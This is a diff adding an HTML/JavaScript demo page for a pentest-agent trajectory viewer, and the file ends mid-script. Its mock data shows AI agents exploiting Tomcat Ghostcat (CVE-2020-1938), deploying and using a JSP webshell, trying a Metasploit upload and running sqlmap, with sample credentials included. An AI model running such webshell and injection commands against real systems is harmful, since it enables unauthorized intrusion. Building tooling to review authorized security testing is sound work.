@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>轨迹 Minimap · artex 风格 Demo(浅色主题)</title>
+<style>
+  /* ── 对齐 web/src/app/globals.css 的 :root 浅色令牌(zinc 系)── */
+  :root {
+    --background: #ffffff; --card: #ffffff; --foreground: #09090b;
+    --muted: #f4f4f5; --muted-foreground: #71717a; --border: #e4e4e7;
+    --primary: #27272a; --primary-foreground: #fafafa;
+    --sky: #0284c7; --sky-600: #0284c7; --amber-600: #d97706; --violet-600: #7c3aed;
+    --teal-600: #0d9488; --pink-600: #db2777; --emerald: #059669; --red: #dc2626;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    background: #fafafa; color: var(--foreground);
+    font: 13px/1.6 ui-sans-serif, system-ui, "Segoe UI", "Microsoft YaHei", sans-serif;
+    display: flex; flex-direction: column;
+  }
+  .mono { font-family: ui-monospace, "Cascadia Code", Consolas, monospace; }
+
+  header { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; padding: 10px 20px; border-bottom: 1px solid var(--border); background: var(--card); }
+  header h1 { font-size: 14px; font-weight: 600; }
+  header .crumb { color: var(--muted-foreground); font-size: 12px; }
+  .live-badge { display: inline-flex; align-items: center; gap: 5px; border: 1px solid rgba(5,150,105,.4); color: var(--emerald); border-radius: 999px; padding: 1px 9px; font-size: 11px; font-weight: 500; }
+  .live-badge i { width: 6px; height: 6px; border-radius: 50%; background: var(--emerald); animation: pulse 1.4s ease-in-out infinite; }
+  @keyframes pulse { 50% { opacity: .25; } }
+  .spacer { flex: 1; }
+  .btn { border: 1px solid var(--border); background: var(--card); color: var(--muted-foreground); border-radius: 6px; padding: 4px 12px; font-size: 12px; cursor: pointer; transition: color .15s, border-color .15s, background .15s; }
+  .btn:hover { color: var(--foreground); background: var(--muted); }
+  .btn.on { border-color: rgba(39,39,42,.4); background: rgba(39,39,42,.08); color: var(--foreground); }
+
+  main { flex: 1; min-height: 0; display: flex; flex-direction: column; gap: 10px; padding: 14px 20px 18px; max-width: 1400px; width: 100%; margin: 0 auto; }
+
+  /* ── 筛选行 ── */
+  .filterbar { display: flex; flex-wrap: wrap; align-items: center; gap: 6px; border: 1px solid var(--border); background: var(--card); border-radius: 8px; padding: 6px 10px; }
+  .fchip { display: inline-flex; align-items: center; gap: 4px; border: 1px solid var(--border); border-radius: 999px; padding: 2px 10px; font-size: 12px; color: var(--muted-foreground); cursor: pointer; user-select: none; opacity: .6; transition: opacity .15s, border-color .15s, background .15s; background: var(--card); }
+  .fchip:hover { opacity: 1; }
+  .fchip.on { border-color: rgba(39,39,42,.4); background: rgba(39,39,42,.07); color: var(--foreground); opacity: 1; }
+  .fchip .cnt { font-size: 10px; color: var(--muted-foreground); }
+  .fchip .sw { width: 7px; height: 7px; border-radius: 50%; }
+  .fsep { width: 1px; height: 16px; background: var(--border); margin: 0 4px; }
+  .fhint { margin-left: auto; font-size: 11px; color: var(--muted-foreground); }
+
+  /* ── 意图归属条 ── */
+  .intentbar { display: flex; flex-wrap: wrap; align-items: center; gap: 8px; border: 1px solid var(--border); background: var(--card); border-radius: 8px; padding: 6px 10px; }
+  .intentbar .lbl { font-size: 11px; color: var(--muted-foreground); }
+  .icard { display: inline-flex; align-items: center; gap: 6px; border: 1px solid rgba(217,119,6,.35); background: rgba(217,119,6,.05); border-radius: 6px; padding: 3px 8px; font-size: 12px; cursor: pointer; transition: border-color .15s, background .15s; }
+  .icard:hover { border-color: rgba(217,119,6,.65); }
+  .icard.on { border-color: var(--amber-600); background: rgba(217,119,6,.13); box-shadow: 0 0 0 1px rgba(217,119,6,.25); }
+  .icard .iid { font-weight: 600; color: #b45309; font-size: 11px; }
+  .icard .itext { color: var(--foreground); max-width: 260px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .icard .iarrow { color: var(--muted-foreground); }
+  .icard .iw { border-radius: 3px; padding: 0 4px; font-size: 9px; font-weight: 500; color: #fff; line-height: 16px; }
+  .icard .ist { font-size: 10px; }
+  .icard .ist.done { color: var(--emerald); }
+  .icard .ist.run { color: var(--sky); }
+
+  /* ── 主卡片:转录 + minimap + 详情抽屉 ── */
+  .stage { flex: 1; min-height: 0; display: flex; border: 1px solid var(--border); background: var(--card); border-radius: 8px; overflow: hidden; }
+  .viewport { flex: 1; min-width: 0; overflow-y: auto; padding: 10px 14px; }
+  .viewport::-webkit-scrollbar { width: 10px; }
+  .viewport::-webkit-scrollbar-thumb { background: #d4d4d8; border-radius: 5px; border: 2px solid var(--card); }
+
+  .row { font-size: 12px; border-radius: 5px; }
+  .row[data-seq] { cursor: pointer; }
+  .row.sel { box-shadow: inset 2px 0 0 var(--primary); background: rgba(39,39,42,.04); }
+  .row-head { display: flex; align-items: flex-start; gap: 8px; padding: 3px 4px; border-radius: 4px; cursor: pointer; text-align: left; width: 100%; background: none; border: none; color: inherit; font: inherit; }
+  .row-head:hover { background: rgba(244,244,245,.8); }
+  .chev { margin-top: 3px; color: var(--muted-foreground); flex-shrink: 0; transition: transform .12s; }
+  .chev.open { transform: rotate(90deg); }
+  .icon { margin-top: 2px; flex-shrink: 0; }
+  .wchip { margin-top: 2px; flex-shrink: 0; border-radius: 3px; padding: 0 4px; font-size: 9px; font-weight: 500; color: #fff; line-height: 16px; }
+  .itag { margin-top: 2px; flex-shrink: 0; border-radius: 3px; padding: 0 4px; font-size: 9px; line-height: 16px; color: #b45309; border: 1px solid rgba(217,119,6,.4); background: rgba(217,119,6,.06); }
+  .tool-name { flex-shrink: 0; font-weight: 500; color: var(--sky); }
+  .trunc { min-width: 0; flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .status-ok { margin-left: auto; flex-shrink: 0; font-weight: 500; color: var(--emerald); }
+  .status-err { margin-left: auto; flex-shrink: 0; font-weight: 500; color: var(--red); }
+  .detail-pre { margin: 0 0 4px 28px; max-height: 220px; overflow: auto; white-space: pre-wrap; word-break: break-all; background: rgba(244,244,245,.7); border: 1px solid var(--border); border-radius: 6px; padding: 8px 10px; font-family: ui-monospace, Consolas, monospace; font-size: 11px; line-height: 1.6; color: #3f3f46; }
+  .thinking-tone { color: #7c3aed; }
+  .text-tone { color: var(--muted-foreground); }
+  .sub-note { font-size: 10px; color: var(--muted-foreground); flex-shrink: 0; }
+
+  .round-divider { display: flex; align-items: center; gap: 8px; margin: 10px 0; font-size: 10px; font-weight: 500; color: var(--muted-foreground); }
+  .round-divider::before, .round-divider::after { content: ""; flex: 1; height: 1px; background: var(--border); }
+
+  .user-bubble-row { display: flex; justify-content: flex-end; gap: 8px; margin: 10px 0 8px; }
+  .user-bubble { max-width: 85%; white-space: pre-wrap; overflow-wrap: anywhere; background: var(--primary); color: var(--primary-foreground); border-radius: 10px; border-top-right-radius: 3px; padding: 6px 12px; font-size: 13px; }
+  .user-avatar { margin-top: 2px; width: 24px; height: 24px; flex-shrink: 0; border-radius: 50%; background: rgba(39,39,42,.07); display: flex; align-items: center; justify-content: center; color: var(--primary); }
+  .answer-card { margin: 4px 0 8px; display: flex; flex-direction: column; gap: 4px; align-items: flex-start; }
+  .answer-body { max-width: 100%; overflow-wrap: break-word; background: var(--muted); border-radius: 8px; padding: 8px 12px; font-size: 13px; }
+  .ts { font-size: 10px; color: var(--muted-foreground); font-variant-numeric: tabular-nums; }
+  .intent-row { display: flex; align-items: center; gap: 8px; padding: 3px 4px; }
+  .intent-chip { display: inline-flex; align-items: center; gap: 5px; border: 1px solid rgba(217,119,6,.4); background: rgba(217,119,6,.07); border-radius: 6px; padding: 3px 8px; font-size: 12px; color: #b45309; min-width: 0; }
+  .intent-chip .t { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .assign { display: inline-flex; align-items: center; gap: 4px; font-size: 10px; color: var(--muted-foreground); flex-shrink: 0; }
+  .row.flash { animation: flash 1.6s ease-out; }
+  @keyframes flash { 0% { background: rgba(39,39,42,.1); } 100% { background: transparent; } }
+
+  /* ── Minimap ── */
+  .minimap { width: 58px; flex-shrink: 0; position: relative; cursor: pointer; border-left: 1px solid var(--border); background: #fafafa; }
+  .mm-block { position: absolute; left: 12px; right: 12px; height: 3px; border-radius: 1px; transition: opacity .15s, left .1s, right .1s; }
+  .mm-block.intent { height: 5px; left: 8px; right: 8px; }
+  .mm-block.dim { opacity: .12; }
+  .mm-block.sel { left: 4px; right: 4px; box-shadow: 0 0 0 1px var(--primary); }
+  .mm-block:hover { left: 6px; right: 6px; }
+  .mm-view { position: absolute; left: 3px; right: 3px; pointer-events: none; border: 1px solid var(--primary); border-radius: 4px; background: rgba(39,39,42,.05); }
+  .mm-live-edge { position: absolute; left: 8px; right: 8px; height: 2px; background: var(--emerald); border-radius: 1px; box-shadow: 0 0 6px rgba(5,150,105,.6); display: none; }
+
+  /* ── 详情抽屉 ── */
+  .drawer { width: 340px; flex-shrink: 0; border-left: 1px solid var(--border); background: #fafafa; display: flex; flex-direction: column; }
+  .drawer[hidden] { display: none; }
+  .dr-head { display: flex; align-items: center; gap: 8px; padding: 10px 12px; border-bottom: 1px solid var(--border); background: var(--card); }
+  .dr-head .t { font-size: 12px; font-weight: 600; flex: 1; min-width: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+  .dr-close { background: none; border: none; color: var(--muted-foreground); cursor: pointer; font-size: 13px; padding: 2px 6px; border-radius: 4px; }
+  .dr-close:hover { background: var(--muted); color: var(--foreground); }
+  .dr-meta { padding: 10px 12px; border-bottom: 1px solid var(--border); display: grid; grid-template-columns: auto 1fr; gap: 4px 12px; font-size: 11px; background: var(--card); }
+  .dr-meta .k { color: var(--muted-foreground); }
+  .dr-meta .v { color: var(--foreground); overflow-wrap: anywhere; }
+  .dr-body { flex: 1; overflow-y: auto; padding: 10px 12px; }
+  .dr-sec { font-size: 10px; font-weight: 600; color: var(--muted-foreground); text-transform: uppercase; letter-spacing: .05em; margin: 10px 0 4px; }
+  .dr-sec:first-child { margin-top: 0; }
+  .dr-pre { white-space: pre-wrap; word-break: break-all; background: var(--card); border: 1px solid var(--border); border-radius: 6px; padding: 8px 10px; font-family: ui-monospace, Consolas, monospace; font-size: 11px; line-height: 1.65; color: #3f3f46; }
+  .dr-think { white-space: pre-wrap; overflow-wrap: anywhere; font-size: 12px; line-height: 1.75; color: #6d28d9; }
+  .dr-link { color: var(--sky); cursor: pointer; }
+  .dr-link:hover { text-decoration: underline; }
+  .err-text { color: var(--red); }
+
+  .tooltip { position: fixed; z-index: 50; pointer-events: none; display: none; max-width: 360px; background: var(--primary); color: var(--primary-foreground); border-radius: 6px; padding: 6px 10px; font-size: 11px; box-shadow: 0 8px 24px rgba(0,0,0,.18); }
+  .tooltip .tt-w { font-size: 9px; color: #fff; border-radius: 3px; padding: 0 4px; margin-right: 6px; }
+  .tooltip .tt-s { color: #d4d4d8; }
+  .tooltip .tt-i { color: #fbbf24; font-size: 10px; margin-top: 2px; }
+
+  .stream-dots { display: flex; gap: 4px; padding: 6px 0 2px 8px; align-items: center; }
+  .stream-dots i { width: 6px; height: 6px; border-radius: 50%; background: var(--primary); animation: bounce 1s infinite; }
+  .stream-dots i:nth-child(2) { animation-delay: -.15s; } .stream-dots i:nth-child(3) { animation-delay: -.3s; }
+  @keyframes bounce { 0%,100% { transform: translateY(0); opacity: .4; } 50% { transform: translateY(-4px); opacity: 1; } }
+</style>
+</head>
+<body>
+
+<header>
+  <span class="crumb">任务 / 外网渗透·192.168.1.0/24 /</span>
+  <h1>轨迹</h1>
+  <span class="live-badge"><i></i>实时</span>
+  <span class="spacer"></span>
+  <button class="btn" id="btnLive">▶ 模拟实时追加</button>
+  <button class="btn" id="btnReset">↺ 重置</button>
+</header>
+
+<main>
+  <div class="filterbar" id="filterbar"></div>
+  <div class="intentbar" id="intentbar"></div>
+
+  <div class="stage">
+    <div class="viewport" id="viewport"></div>
+    <div class="minimap" id="minimap">
+      <div class="mm-view" id="mmView"></div>
+      <div class="mm-live-edge" id="mmEdge"></div>
+    </div>
+    <aside class="drawer" id="drawer" hidden>
+      <div class="dr-head"><span class="t" id="drTitle"></span><button class="dr-close" id="drClose">✕</button></div>
+      <div class="dr-meta" id="drMeta"></div>
+      <div class="dr-body" id="drBody"></div>
+    </aside>
+  </div>
+</main>
+
+<div class="tooltip" id="tip"></div>
+
+<script>
+// ════════════════ 数据:与 activity 表 kind 对齐;iid = 所属意图 ════════════════
+// thinking 带 sec(推理耗时)与 tk(token);tool_use 带 input(入参)/out(出参)/dur/st
+const BASE = [
+  { w:'mainagent', k:'user',    s:'目标:对 192.168.1.0/24 进行外网渗透测试,取得至少一台主机立足点。禁止内网扫描与横向移动。', ts:'10:00:00' },
+  { w:'mainagent', k:'thinking',s:'分析任务范围与授权约束:仅外部探测与利用,目标网段两台存活主机待确认,先把目标拆解交给规划。', sec:14, tk:812,
+      d:'让我先梳理任务约束:\n\n1. 授权范围是 192.168.1.0/24 的外部渗透,明确禁止内网扫描与横向移动——所有动作必须限制在边界服务上;\n2. 存活主机未知,需要先资产发现,再服务识别,最后漏洞验证;\n3. "取得立足点"的验收标准是可获得稳定命令执行通道(WebShell 或交互式 Shell),单次 RCE 回显不算;\n4. 风险点:8080 类端口的中间件指纹容易误判,nmap 版本探测结果需要交叉验证。\n\n结论:这个任务不需要我直接执行,转交 Planner 拆解为并行探测意图效率最高。', ts:'10:00:05' },
+  { w:'mainagent', k:'text',    s:'范围已确认,转交规划拆解目标。', ts:'10:00:19' },
+  { w:'planner',   k:'round',   s:'第 1 轮', ts:'10:00:21' },
+  { w:'planner',   k:'thinking',s:'拆解为三阶段:信息收集 → 漏洞探测 → 立足点获取。先并行下发两条探测意图。', sec:9, tk:534,
+      d:'阶段划分:\n- 阶段一(信息收集):.10 与 .20 并行,互不依赖,可下两条意图给两个 Worker;\n- 阶段二(漏洞探测):依赖阶段一的指纹结果,无法提前下发;\n- 阶段三(立足点):只有拿到明确可利用证据才推进。\n\n先下两条:全端口扫描(.10)、Web 路径探测(.20)。', ts:'10:00:24' },
+  { w:'planner',   k:'intent',  s:'对 192.168.1.10 做全端口扫描与服务识别', iid:'I1', ts:'10:00:33' },
+  { w:'planner',   k:'intent',  s:'探测 192.168.1.20 的 Web 服务与敏感路径', iid:'I2', ts:'10:00:35' },
+  { w:'review',    k:'thinking',s:'两条意图均为常规探测,无越权风险,建议通过。', sec:5, tk:268, iid:['I1','I2'],
+      d:'预审检查:\n- 意图1 目标 .10 在授权网段内,全端口扫描属常规信息收集 ✓\n- 意图2 目标 .20 在授权网段内,目录爆破使用通用字典,不涉及认证绕过 ✓\n- 两条意图均未触碰"禁止内网"约束 ✓\n\n建议:全部通过。', ts:'10:00:41' },
+  { w:'review',    k:'intent',  s:'预审通过:意图1、意图2', iid:['I1','I2'], ts:'10:00:46' },
+  { w:'work#1',    k:'thinking',s:'领取意图1。目标 .10 服务分布未知,先 -p- 全端口 + -sV 版本探测,输出归档到任务目录。', sec:7, tk:342, iid:'I1',
+      d:'执行意图1。计划:\n1. nmap -sV -p- 全端口扫描(预计 2-4 分钟);\n2. 对开放端口按需追加 NSE 脚本;\n3. 结果落盘 scans/nmap-10.txt,供后续阶段引用。', ts:'10:00:52' },
+  { w:'work#1',    k:'tool_use',tool:'nmap', iid:'I1', ts:'10:00:59', dur: 204,
+      input:{ cmd:'nmap -sV -p- -oN scans/nmap-10.txt 192.168.1.10' },
+      out:'PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.4\n80/tcp   open  http    nginx 1.18.0\n8080/tcp open  http    Apache Tomcat 9.0.30\n8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)', st:'ok' },
+  { w:'work#2',    k:'thinking',s:'领取意图2。先 whatweb 快扫指纹,再按结果决定字典爆破深度。', sec:6, tk:295, iid:'I2',
+      d:'执行意图2。计划:whatweb 识别框架与服务器 → gobuster 通用字典爆破敏感路径 → 对命中的高危路径逐个验证。', ts:'10:01:03' },
+  { w:'work#2',    k:'tool_use',tool:'whatweb', iid:'I2', ts:'10:01:09', dur: 30,
+      input:{ url:'http://192.168.1.20', plugins:['title','server','framework'] },
+      out:'http://192.168.1.20 [200 OK] Apache[2.4.41], PHP[7.2.24], Title[内部OA系统]', st:'ok' },
+  { w:'work#2',    k:'tool_use',tool:'gobuster', iid:'I2', ts:'10:01:39', dur: 276,
+      input:{ cmd:'gobuster dir -u http://192.168.1.20 -w common.txt -t 30' },
+      out:'/admin (Status: 302)\n/backup.zip (Status: 200)\n/uploads (Status: 403)\nProgress: 4714 / 4714 (100.00%)', st:'ok' },
+  { w:'work#1',    k:'thinking',s:'8080 是 Tomcat 9.0.30,且 8009 暴露了 AJP——CVE-2020-1938 文件包含的版本区间正好覆盖,优先验证。', sec:11, tk:587, iid:'I1',
+      d:'关键观察:nmap 报 8009/tcp open ajp13。Tomcat 9.0.30 < 9.0.31,在 CVE-2020-1938(Ghostcat)影响范围内。\n\n利用思路:AJP 协议未鉴权,可构造 AJP13 Forward Request 读取 webapps 下任意文件;若配合文件上传可升级 RCE。先用 NSE ajp-request 确认协议可达,再用 ajpy 读 /WEB-INF/web.xml 拿配置与凭据。\n\n风险:只读操作,对目标无破坏性,符合授权范围。', ts:'10:04:23' },
+  { w:'work#1',    k:'tool_use',tool:'nmap', iid:'I1', ts:'10:04:34', dur: 96,
+      input:{ cmd:'nmap --script=ajp-request -p8009 192.168.1.10' },
+      out:'8009/tcp open ajp13\n| ajp-request:\n|   AJP/1.3 connector exposed, responds to forward requests', st:'ok' },
+  { w:'work#2',    k:'tool_use',tool:'curl', iid:'I2', ts:'10:06:10', dur: 12,
+      input:{ cmd:'curl -sI http://192.168.1.20/backup.zip' },
+      out:'HTTP/1.1 200 OK\nContent-Length: 184320\nLast-Modified: Thu, 30 Oct 2026 02:14:11 GMT', st:'ok' },
+  { w:'planner',   k:'round',   s:'第 2 轮', ts:'10:06:22' },
+  { w:'planner',   k:'thinking',s:'两条 lane 均有发现:Tomcat AJP 暴露 + OA 备份包泄露。AJP 路径更直接,优先推进。', sec:8, tk:461,
+      d:'汇总两条 lane:\n- Worker 1:Tomcat 9.0.30 + AJP 8009 暴露 → CVE-2020-1938 可直达凭据读取,利用链短、确定性高;\n- Worker 2:backup.zip(180KB)可静态分析,收益不确定,作为副线继续。\n\n决策:下发意图3(AJP 利用链)给 Worker 1;Worker 2 继续意图2的源码分析。', ts:'10:06:25' },
+  { w:'planner',   k:'intent',  s:'利用 CVE-2020-1938 读取 Tomcat 凭据并尝试获取 WebShell', iid:'I3', ts:'10:06:33' },
+  { w:'review',    k:'intent',  s:'预审通过:漏洞利用在授权范围内', iid:'I3', ts:'10:06:40' },
+  { w:'work#1',    k:'tool_use',tool:'python', iid:'I3', ts:'10:06:47', dur: 66,
+      input:{ cmd:'python3 ajpy.py tomcat --target 192.168.1.10 --read /WEB-INF/web.xml' },
+      out:'<?xml version="1.0" encoding="UTF-8"?>\n<web-app ...>\n  <user tomcat roles="manager-script" password="s3cretOps!"/>\n  ...\n</web-app>', st:'ok' },
+  { w:'work#2',    k:'tool_use',tool:'wget', iid:'I2', ts:'10:07:53', dur: 48,
+      input:{ cmd:'wget -q http://192.168.1.20/backup.zip && unzip -oq backup.zip -d bak' },
+      out:'bak/config/db.php  bak/admin/  bak/lib/  …(共 47 个文件)', st:'ok' },
+  { w:'work#1',    k:'thinking',s:'拿到 manager 凭据 tomcat/s3cretOps!。先试 tomcat_mgr_upload,失败再退回 AJP 写 JSP。', sec:6, tk:298, iid:'I3', ts:'10:07:55',
+      d:'凭据有效的前提是 /manager 未限制来源 IP。利用优先级:\n1. msf tomcat_mgr_upload 直接部署 WAR(最干净);\n2. 失败则退回 CVE-2020-1938 文件包含写 JSP。\n\n注意清理:无论哪条路径,落地文件名要与应用技术栈一致,禁止攻击特征命名。', ts:'10:07:55' },
+  { w:'work#1',    k:'tool_use',tool:'msfconsole', iid:'I3', ts:'10:08:01', dur: 152,
+      input:{ module:'exploit/multi/http/tomcat_mgr_upload', RHOSTS:'192.168.1.10', RPORT:8080, HttpUsername:'tomcat', HttpPassword:'s3cretOps!' },
+      out:'[-] Exploit aborted: login failed with tomcat:s3cretOps!', st:'fail', err:'登录被拒:/manager/html 限制了来源 IP(RewriteValve 白名单),凭据本身有效但通道不可用' },
+  { w:'work#1',    k:'thinking',s:'manager 路径被 IP 白名单封了,退回 AJP 文件包含直接写 JSP。', sec:9, tk:445, iid:'I3',
+      d:'plan A 失败原因明确:管理台有来源 IP 白名单。但 AJP 通道不受该限制——\n\nplan B:通过 CVE-2020-1938 的 LFI,把 JSP 内容作为"被包含文件"写入可访问路径并触发解析。落地名用 shell.jsp 这种与应用技术栈匹配的正常命名,路径 webapps/ROOT/ 下,与 [投放] 记录保持一致。', ts:'10:10:33' },
+  { w:'work#1',    k:'tool_use',tool:'python', iid:'I3', ts:'10:10:42', dur: 88,
+      input:{ cmd:'python3 ajp_lfi_deploy.py 192.168.1.10 --deploy webapps/ROOT/shell.jsp' },
+      out:'[+] payload written via AJP include\n[+] verified: http://192.168.1.10:8080/shell.jsp?pwd=artex → whoami = tomcat', st:'ok' },
+  { w:'work#1',    k:'tool_use',tool:'shell_add', iid:'I3', ts:'10:12:10', dur: 6,
+      input:{ url:'http://192.168.1.10:8080/shell.jsp', type:'jsp', auth:'pwd=artex' },
+      out:'已登记 WebShell,类型:JSP,连接验证通过', st:'ok' },
+  { w:'work#1',    k:'tool_use',tool:'report_finding', iid:'I3', ts:'10:12:16', dur: 10,
+      input:{ foothold:true, target:'192.168.1.10', evidence:['shell.jsp','ajp_lfi 输出','web.xml 凭据片段'] },
+      out:'Finding #F-1042 已创建,关联证据 3 条,状态:待复核', st:'ok' },
+  { w:'work#1',    k:'result',  s:'已在 192.168.1.10 取得 WebShell 立足点(CVE-2020-1938 → AJP 文件包含 → JSP 部署)。证据:shell.jsp 可执行 whoami=tomcat。', iid:'I3', tk:1280, ts:'10:12:26' },
+  { w:'work#2',    k:'tool_use',tool:'grep', iid:'I2', ts:'10:08:41', dur: 18,
+      input:{ cmd:'grep -rn "password\\|passwd" bak/config/' },
+      out:'bak/config/db.php:9:  $db_pass = "Oa@2024!prod";', st:'ok' },
+  { w:'work#2',    k:'tool_use',tool:'sqlmap', iid:'I2', ts:'10:09:02', dur: 340,
+      input:{ cmd:'sqlmap -u "http://192.168.1.20/login.php" --forms --batch --dbs' },
+      out:'[INFO] POST parameter "username" is boolean-based blind injectable\navailable databases [2]:\n[*] information_schema\n[*] oa_db', st:'ok' },
+  { w:'work#2',    k:'result',  s:'192.168.1.20 OA 登录表单存在布尔盲注,已枚举 2 个库;另从备份源码获取数据库口令(目标未暴露 DB 端口,暂不可用)。', iid:'I2', tk:940, ts:'10:14:42' },
+  { w:'planner',   k:'round',   s:'第 3 轮', ts:'10:15:02' },
+  { w:'planner',   k:'thinking',s:'立足点已达成,目标完成,汇总终答。', sec:5, tk:233,
+      d:'目标"取得立足点"已由 Worker 1 完成(F-1042)。Worker 2 的注入点作为附加发现保留;按任务约束(禁止横向),不派发内网渗透子任务。收尾:汇报两条发现,标记任务完成。', ts:'10:15:04' },
+  { w:'planner',   k:'result',  s:'规划侧汇总:立足点 ×1(F-1042,192.168.1.10 WebShell)+ SQL 注入 ×1(192.168.1.20)。未触发内网渗透派发:任务范围禁止横向移动。', tk:620, ts:'10:15:09' },
+  { w:'mainagent', k:'result',  s:'任务完成。① 192.168.1.10:Tomcat AJP 文件包含(CVE-2020-1938)→ WebShell 立足点,Finding F-1042;② 192.168.1.20:OA 登录布尔盲注 + 备份包口令泄露。全部动作均在授权范围内,未触碰内网。', tk:1050, ts:'10:15:14' },
+];
+
+const INTENTS = [
+  { id:'I1', text:'对 192.168.1.10 做全端口扫描与服务识别', worker:'work#1', status:'done' },
+  { id:'I2', text:'探测 192.168.1.20 的 Web 服务与敏感路径', worker:'work#2', status:'done' },
+  { id:'I3', text:'利用 CVE-2020-1938 读取凭据并获取 WebShell', worker:'work#1', status:'done' },
+];
+
+const LIVE = [
+  { w:'work#1',   k:'thinking',s:'立足点已稳定,补充一次权限与持久化检查。', sec:6, tk:287, iid:'I3',
+      d:'确认当前为 tomcat 服务账户,无 sudo 权限;按任务约束不做提权与持久化,仅记录现状供报告引用。', ts:'10:15:20' },
+  { w:'work#1',   k:'tool_use',tool:'curl', iid:'I3', ts:'10:15:26', dur: 4,
+      input:{ cmd:'curl -s "http://192.168.1.10:8080/shell.jsp?pwd=artex&c=id"' },
+      out:'uid=997(tomcat) gid=995(tomcat) groups=995(tomcat)', st:'ok' },
+  { w:'work#2',   k:'thinking',s:'把盲注导出的表结构写入证据库。', sec:4, tk:198, iid:'I2',
+      d:'oa_db 共 23 表,oa_users 含 md5 口令列,写入证据供报告引用;不再深入拖库,避免过度收集。', ts:'10:15:31' },
+  { w:'work#2',   k:'tool_use',tool:'report_finding', iid:'I2', ts:'10:15:35', dur: 9,
+      input:{ type:'sqli', target:'192.168.1.20', param:'username', dbms:'MySQL' },
+      out:'Finding #F-1043 已创建,关联证据 2 条', st:'ok' },
+  { w:'work#2',   k:'result',  s:'补充:F-1043(SQL 注入)证据链已归档,报告输入就绪。', iid:'I2', tk:410, ts:'10:15:44' },
+  { w:'mainagent',k:'text',    s:'全部目标完成,任务进入收尾。', ts:'10:15:47' },
+];
+
+// ════════════════ 框架 ════════════════
+const KIND_META = {
+  user:       { label:'用户',    c:'#2563eb', group:'系统' },
+  intent:     { label:'意图',    c:'#d97706', group:'系统' },
+  thinking:   { label:'思考',    c:'#7c3aed', group:'思考' },
+  text:       { label:'文本',    c:'#71717a', group:'文本' },
+  tool_use:   { label:'工具调用', c:'#0284c7', group:'工具' },
+  tool_result:{ label:'工具返回', c:'#059669', group:'工具' },
+  round:      { label:'轮次',    c:'#a1a1aa', group:'系统' },
+  result:     { label:'结果',    c:'#16a34a', group:'结果' },
+};
+const WORKER_COLOR = { mainagent:'var(--primary)', planner:'var(--amber-600)', review:'var(--pink-600)', 'work#1':'var(--sky-600)', 'work#2':'var(--violet-600)' };
+const WORKER_LABEL = { mainagent:'主 Agent', planner:'规划', review:'审核', 'work#1':'Worker 1', 'work#2':'Worker 2' };
+const KIND_GROUPS = ['思考','文本','工具','结果','系统'];
+
+const ICONS = {
+  chev: '<svg class="chev" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4"><path d="M9 6l6 6-6 6"/></svg>',
+  wrench: t => `<svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="${t}" stroke-width="2"><path d="M14.7 6.3a4 4 0 0 0-5.4 5.4L3 18v3h3l6.3-6.3a4 4 0 0 0 5.4-5.4L14 13l-3-3 3.7-3.7z"/></svg>`,
+  brain: '<svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#7c3aed" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M9 10a3 3 0 0 1 6 0c0 2-3 2-3 4M12 17h.01"/></svg>',
+  msg: '<svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#71717a" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>',
+  user: '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M4 21c0-4 3.6-6 8-6s8 2 8 6"/></svg>',
+  flag: '<svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#d97706" stroke-width="2"><path d="M4 22V4c4-2 8 2 12 0v10c-4 2-8-2-12 0"/></svg>',
+};
+
+let steps = [], seq = 0, selSeq = null, iFilter = null;
+const wFilter = new Set(), kFilter = new Set(KIND_GROUPS);
+const vp = document.getElementById('viewport'), mm = document.getElementById('minimap');
+const mmView = document.getElementById('mmView'), tip = document.getElementById('tip');
+let liveTimer = null;
+const dur = s => s >= 60 ? (s/60).toFixed(1)+' min' : s+'s';
+const esc = s => String(s).replace(/[&<>]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
+const iidsOf = st => st.iid ? (Array.isArray(st.iid) ? st.iid : [st.iid]) : [];
+const intentById = id => INTENTS.find(i => i.id === id);
+
+function addSteps(list) { list.forEach(x => steps.push({ ...x, seq: ++seq })); }
+
+function visible(st) {
+  if (!(wFilter.size === 0 || wFilter.has(st.w))) return false;
+  if (!kFilter.has(KIND_META[st.k].group)) return false;
+  if (iFilter) {
+    if (st.k === 'round') return false;
+    return iidsOf(st).includes(iFilter);
+  }
+  return true;
+}
+
+// ── 筛选行 ──
+function renderFilterbar() {
+  const counts = {};
+  steps.forEach(s => counts[s.w] = (counts[s.w]||0)+1);
+  let h = '';
+  ['mainagent','planner','review','work#1','work#2'].filter(w => counts[w]).forEach(w => {
+    const on = wFilter.size === 0 || wFilter.has(w);
+    h += `<span class="fchip ${on?'on':''}" data-w="${w}"><i class="sw" style="background:${WORKER_COLOR[w]}"></i>${WORKER_LABEL[w]}<span class="cnt">${counts[w]}</span></span>`;
+  });
+  h += '<span class="fsep"></span>';
+  KIND_GROUPS.forEach(g => h += `<span class="fchip ${kFilter.has(g)?'on':''}" data-k="${g}">${g}</span>`);
+  h += `<span class="fhint">点行查看详情 · 点 minimap 色块跳转</span>`;
+  document.getElementById('filterbar').innerHTML = h;
+}
+
+// ── 意图归属条:哪个 Worker 领了哪个意图 ──
+function renderIntentbar() {
+  let h = '<span class="lbl">意图归属:</span>';
+  INTENTS.forEach(it => {
